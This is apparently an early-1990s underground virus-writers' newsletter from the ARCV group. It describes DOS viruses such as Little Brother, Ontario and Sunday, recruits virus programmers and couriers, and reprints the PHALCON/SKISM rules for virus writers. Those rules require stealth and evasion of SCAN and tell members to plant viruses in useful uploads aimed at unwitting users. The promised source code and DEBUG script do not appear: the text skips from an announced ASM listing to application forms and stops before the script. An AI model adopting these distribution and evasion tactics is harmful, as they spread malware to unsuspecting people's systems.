     Welcome to the first ARCV Newsletter....

     We hope you are all having a Spiffing Time out there....

     First lets introduce the 'Team'.

     The Keyboard Basher - Apache Warrior.
     The Other One - ICE-9.

     Well you may or may not know that we here are one the only Truly
     English Computer Underground Organisation (And just to piss off the
     Americans Out there we will spell everything with an 's' not a 'z'). 
     In this and future newsletters we will be dodging Special Branch and
     New Scotland Yard as we go, as well as putting in the odd virus ASM
     file, Debug Dump for you all to have fun with.  We will also provide
     information on what's happening (DUDE) out there in Computer Land.

                              Little Brother.

     Now this virus, is rather crafty as is relies on good old MSDOS
program handling to work, ie. The Fact that .COM files are allways load
before .EXE files.  First lets see what Patti has to say.

 Virus Name:  Little Brother  
 Aliases:     
 V Status:    Rare 
 Discovered:  October, 1991 
 Symptoms:    307 byte .COM files 
 Origin:      The Netherlands 
 Eff Length:  307 Bytes 
 Type Code:   SRCE - Spawning Resident .EXE Infector 
 Detection Method:  ViruScan, AVTK 5.54+, F-Prot 2.03+, Novi 1.1d+ 
 Removal Instructions:  Delete infected .COM programs 
 
 General Comments: 
     The Little Brother virus was submitted from the Netherlands in
October, 1991.  This virus is a spawning virus similar in technique to the
Aids 2 and Twin-351 viruses.  
 
     The first time a program infected with Little Brother is executed,
Little Brother will become memory resident in a "hole" in low system memory
in the system data area, hooking interrupt 21.  There will be no change in
total system or available free memory.  

     Once resident, the Little Brother virus will infect .EXE programs when
they are executed.  The .EXE program itself will not be altered, but a
corresponding .COM program will be created by the virus of 307 bytes.  This
corresponding.COM program will contain pure virus code and have a date/time
stamp in the DOS directory of when it was created.  The following text
strings can be found in the 307 byte .COM files: 
 
               "Little Brother" 
               "EXE COM" 
 
     Since DOS will execute .COM programs before .EXE programs, whenever
the user attempts to execute a .EXE program, the corresponding .COM program
will be executed first.  The .COM program, when finished will then start
the .EXE program the user was attempting to execute. 

     Well lets get to the Asm source.

     Well I thought it could be a good idea if I put in the relevant ARCV
Application forms for any one who may wish to join the ranks of the ARCV. 
At the moment we are looking for MAC Virus programmers, and AMIGA Virus
Programmers and others.  Also we are looking Couriers for the ARCV (BBS's
for Distribution), that are based all over the world in Britain, USA and
Eastern Europe Mainly but other countries will get equal consideration.  so
less of the waffle and to the Applications.

    ARTICLE I - REGARDING ORIGINAL VIRII
         Section A - DEFINITION
             The term "original virus" herein indicates programming done
             exclusively by either one individual or group, with no code
             taken from any other source, be it a book or another virus.
         Section B - CODE REQUIREMENTS
             For an original virus to conform to the standards set by
             this document, it must include the following:
                 1) The title of the virus in square brackets followed by a
                    zero byte should be in the code, in a form suitable for
                    inclusion into SCAN(1).  This is to ensure that the
                    name of the virus is known to those examining it.
                 2) The name of the author and his/her group affiliation/s
                    should be included in the code, followed by a zero
                    byte.  At the present, this is an optional requirement.
                 3) Some form of encryption or other form of stealth
                    techniques must be used.  Even a simple XOR routine
                    will suffice.
                 4) If the virus infects files, the code should be able to
                    handle infection of read only files.
                 5) It must have some feature to distinguish it from other
                    virii.  Creativity is encouraged above all else.
                 6) The virus must not be detectable by SCAN.
         Section C - IMPLEMENTATION
             This section, and all sections hereafter bearing the heading
             "IMPLEMENTATION" refer to the recommended method of
             implementation of the suggestions/requirements listed in the
             current article.
                 1) Virus_Name db '[Avocado]',0
                 2) Author     db 'Dark Angel, PHALCON/SKISM',0
  
    ARTICLE II - REGARDING "HACKED" VIRII
         Section A - DEFINITION
             The term "hacked virus" herein refers to any virus written
             by either one individual or a group which includes code
             taken from any other source, be it a book, a code fragment,
             or the entire source code from another virus.
             The term "source virus" herein refers to the virus which
             spawned the "hacked virus."
         Section B - CODE REQUIREMENTS
             For a "hacked" virus to conform to the standards set forth
             by this document, it must include the following, in addition
             to all the requirements set down in Article I of this
             document:
                 1) The title, author (if available), and affiliation of
                    the author (if available) of the original virus.
                 2) The author of the hacked virus must give the source
                    code of said virus to the author of the source virus
                    upon demand.
                 3) No more Jerusalem, Burger, Vienna, Stoned, and Dark
                    Avenger hacks are to be written.
                 4) The source virus must be improved in some manner
                    (generally in efficiency of speed or size).
                 5) The hacked virus must significantly differ from the
                    source virus, i.e. it cannot be simply a text change.
         Section C - IMPLEMENTATION
                 1) Credit db 'Source stolen from Avocado by Dark Angel of
                    PHALCON/SKISM',0
    ARTICLE III - REGARDING VIRAL STRAINS
         Section A - DEFINITION
             The term "viral strain" herein refers to any virus written
             by the original author which does not significantly differ
             from the original.  It generally implies a shrinking in code
             size, although this is not required.
         Section B - CODE REQUIREMENTS
             For a "viral strain" to conform to the standards set by this
             document, it must include the following, in addition to all
             the requirements set down in Article I of this document:
                 1) The name of the virus shall be denoted by the name of
                    the original virus followed by a dash and the version
                    letter.
                 2) The name of the virus must not change from that of the
                    original strain.
                 3) A maximum of two strains of the virus can be written.
         Section C - IMPLEMENTATION
                 1) Virus_Name db '[Avocado-B]',0
  
    ARTICLE IV - DISTRIBUTION
         Section A - DEFINITION
             The term "distribution" herein refers to the transport of
             the virus through an infected file to the medium of storage
             of a third (unwitting) party.
         Section B - INFECTION MEDIUM
             The distributor shall infect a file with the virus before
             uploading.  Suggested files include:
                 1) Newly released utility programs.
                 2) "Hacked" versions of popular anti-viral software, i.e.
                    the version number should be changed, but little else.
                 3) Beta versions of any program.
              The infected file, which must actually do something useful,
              will then be uploaded to a board.  The following boards are
              fair game:
                 1) PD Boards
                 2) Lamer boards
                 3) Boards where the sysop is a dick
               No virus shall ever be uploaded, especially by the author,
               directly to an antivirus board, such as HomeBase or
               Excalibur.
         Section C - BINARY AND SOURCE CODE AVAILABILITY
               The binary of the virus shall not be made available until at
               least two weeks after the initial (illicit) distribution of
               the virus.  Further, the source code, which need not be made
               available, cannot be released until the latest version of
               SCAN detects the virus.  The source code, should it be made
               available, should be written in English.
         Section D - DOCUMENTATION
             Documentation can be included with the archive containing
             the binary of the virus, although this is optional.  The
             author should include information about the virus suitable
             for inclusion in the header of VSUM(2).  A simple
             description will follow, though the author need not reveal
             any "hidden features" of the virus.  Note this serves two
             purposes:
                 1) Enable others to effectively spread the virus without
                    fear of self-infection.
                 2) Ensure that your virus gets a proper listing in VSUM.
    ARTICLE V - AMENDMENTS
         Section A - PROCEDURE
             To propose an amendment, you must first contact a
             PHALCON/SKISM member through one of our member boards.
             Leave a message to one of us explaining the proposed change.
             It will then be considered for inclusion.  A new copy of the
             Constitution will then be drafted and placed on member
             boards under the filename "PS-CONST.TXT" available for free
             download by all virus writers.  Additionally, an updated
             version of the constitution will be published periodically
             in our newsletter.
         Section B - AMENDMENTS
             None as of this writing.
  
    ARTICLE VI - MISCELLANEOUS
         Section A - WHO YOU CAN MAKE FUN OF
             This is a list of people who, over the past few years, have
             proved themselves to be inept and open to ridicule.
                 1) Ross M. Greenberg, author of FluShot+
                 2) Patricia (What's VSUM?) Hoffman.
                 2) People who post "I am infected by Jerusalem, what do I
                    do?" or "I have 20 virii, let's trade!"
                 3) People who don't know the difference between a virus
                    and a trojan.
                 4) Lamers and "microwares puppies"
         Section B - WHO YOU SHOULDN'T DIS TOO BADLY
             This is a list of people who, over the past few years, have
             proved themselves to be somewhat less inept and open to
             ridicule than most.
                 1) John McAfee, nonauthor of SCAN
                 2) Dennis, true author of SCAN
         Section C - MOTIVATION
             In most cases, the motivation for writing a virus should not
             be the pleasure of seeing someone else's system trashed, but
             to test one's programming abilities.

The ARCV'92  
Octarine - The Pigment of Imagination......
---------------------------------------------------------------------------ARCV NEWS                                                              003.
 
                 The Association of Really Cruel Viruses.


     This is one of the first English Computer Underground groups, although
we are an English organisation we can only be contacted through American or
Eastern Europe Virus boards.  Or we will contact through a Fidonet address.

                             What is The ARCV.

     ARCV is a organisation that is involved in Writing and Research of
computer viruses.  We hold a Library of IBM Computer viruses for the use of
the ARCV members.  But as a group we are involved in viruses for most the
main computer types (IBM PC, AMIGA, ST, MAC).  We have a Bi-Monthly
newsletter with the latest virus news from around the country and from
around the world, virus Dis-Assemblies and other virus Debug Scripts.  We
have links with PHALCON/SKISM in the US, we also have links with some
Eastern Europe Virus writers.  Are group is not only limited to virus
activities but other 'Underground' activities also (Hacking, Phreaking
etc.) so any new members who don't write viruses could be involved in any
of the other activities we are involved in.

     Are members come from the youths of today, at the moment we are mainly
English students that wish to beat and know more about the system.  We come
from a range of backgrounds from the Electronics side and the Computer
side, I myself Apache Warrior come mainly from the Electronics side but
branched to the Computer side fully around 2 years ago.  I Hack, Phreak and
write Viruses, I am the President of the group (after all I started the
group) and I am some what of an expert on beating the BT phone exchange and
being a BBS A HOLIC that comes in very handy.  Now ICE-9 is also a
Electronics guy who turned to the computer he writes viruses and is into
Heavy Metal.  Now the picture put out by the Anti-Virus Authors is that
Virus writers are Sad individuals who wear Anoraks and go Train Spotting
but well they are sadly mistaken, we are very intelligent, sound minded,
highly trained, and we wouldn't be seen in an Anorak or near an Anorak even
if dead.

     We aim to provide the ARCV members and some Non-Members an insight to
the computer underground world and would you believe it is huge.  The Group
is always seeking new members and we require new members to stay afloat,
soon we will be opening the world HQ in the UK this will have special
access areas for the ARCV members these will include access to the ARCV
Virus Library, all of which are legit viruses and No Trojans.ARCV NEWS                                                              004.

                           The Ontario Virus 

     Well heres a virus from Canada.
 
 V Status:    Rare 
 Discovered:  July, 1990 
 Symptoms:    .COM & .EXE growth; decrease in system and free memory; 
              hard disk errors in the case of extreme infections 
 Origin:      Ontario, Canada 
 Eff Length:  512 Bytes 
 Type Code:   PRtAK - Parasitic Encrypted Resident .COM & .EXE Infector 
 Detection Method:  ViruScan V66+, Pro-Scan 2.01+, NAV 
 Removal Instructions:  SCAN /D, or Delete infected files 
 General Comments: 
     The Ontario Virus was isolated by Mike Shields in Ontario, Canada in
     July, 1990.  The Ontario virus is a memory resident infector of .COM,
     .EXE, and overlay files.  It will infect COMMAND.COM. 

     The first time a program infected with the Ontario Virus is executed,
     it will install itself memory resident above the top of system memory
     but below the 640K DOS boundary.  Total system memory and free memory
     will be decreased by 2,048 bytes.  At this time, the virus will infect
     COMMAND.COM on the C: drive, increasing its length by 512 bytes. 
 
     Each time an uninfected program is executed on the system with the
     virus memory resident, the program will become infected with the viral
     code located at the end of the file.  For .COM files, they will
     increase by 512 bytes in all cases.  For .EXE and overlay files, the
     file length increase will be 512 - 1023 bytes.  The difference in
     length for .EXE and overlay files is because the virus will fill out
     the unused space at the end of the last sector of the uninfected file
     with random data (usually a portion of the directory) and then append
     itself to the end of the file at the next sector.  Systems using a
     sector size of more than 512 bytes may notice larger file increases
     for infected files.  Infected files will always have a file length
     that is a multiple of the sector size on the disk. 
 
     In the case of extreme infections of the Ontario Virus, hard disk
     errors may be noticed. 
 
     Ontario uses a complex encryption routine, and a simple identification
     string will not identify this virus.

                             The Sunday Virus 
 
     According to Patty Hoffman, the Sunday virus is based on the Jerusalem
viruses, because the codes for both viruses are similar.  Sunday infects
COM, EXE, and OVL files, when they are executed, and it stays resident in
memory.  It was circulated around the Seattle, Washington area in 1989, and
is very common.

     How ever this version of Sunday doesn't seem to print any messages on
the screen, like some of the other versions do, every Sunday.  This virus
spreads rapidly, and is a great replicator.
 
     To create SUNDAY.COM, cut out the following code, and name the
resulting file sunday.scr.  Then, use this command:  DEBUG < SUNDAY.SCR
this will then produce the .COM all ready for use.
